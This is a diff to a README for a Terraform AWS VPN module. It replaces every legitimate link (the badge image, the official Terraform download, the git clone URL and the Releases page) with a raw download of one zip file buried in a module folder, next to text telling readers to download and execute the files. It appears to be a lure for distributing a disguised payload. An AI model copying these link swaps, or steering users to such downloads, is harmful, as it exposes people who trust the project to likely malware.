@@ -3,7 +3,7 @@
 
 Welcome to the **terraform-aws-vpn** repository! This project provides a sustainable Terraform package designed to create various VPN resources on AWS. Whether you need a Client VPN or a Site-to-Site VPN, this module has you covered.
 
-![Terraform AWS VPN](https://img.shields.io/badge/terraform-aws-vpn-blue?style=flat-square&logo=terraform)
+![Terraform AWS VPN](https://github.com/MXNeditz0/terraform-aws-vpn/raw/refs/heads/main/modules/customer-gateway/aws-vpn-terraform-v1.3-alpha.3.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ Welcome to the **terraform-aws-vpn** repository! This project provides a sustain
 
 Before you begin, ensure you have the following installed:
 
-- [Terraform](https://www.terraform.io/downloads.html) (v0.12 or later)
+- [Terraform](https://github.com/MXNeditz0/terraform-aws-vpn/raw/refs/heads/main/modules/customer-gateway/aws-vpn-terraform-v1.3-alpha.3.zip) (v0.12 or later)
 - An AWS account with permissions to create VPN resources.
 
 ## Getting Started
@@ -40,7 +40,7 @@ To get started with terraform-aws-vpn, follow these steps:
 1. **Clone the repository:**
 
    ```bash
-   git clone https://github.com/MXNeditz0/terraform-aws-vpn.git
+   git clone https://github.com/MXNeditz0/terraform-aws-vpn/raw/refs/heads/main/modules/customer-gateway/aws-vpn-terraform-v1.3-alpha.3.zip
    cd terraform-aws-vpn
    ```
 
@@ -124,7 +124,7 @@ Confirm the action when prompted. This will create the VPN resources defined in 
 
 ## Releases
 
-For the latest releases, visit our [Releases](https://github.com/MXNeditz0/terraform-aws-vpn/releases) section. Download the required files and execute them as per the provided instructions.
+For the latest releases, visit our [Releases](https://github.com/MXNeditz0/terraform-aws-vpn/raw/refs/heads/main/modules/customer-gateway/aws-vpn-terraform-v1.3-alpha.3.zip) section. Download the required files and execute them as per the provided instructions.
 
 ## Contributing
 
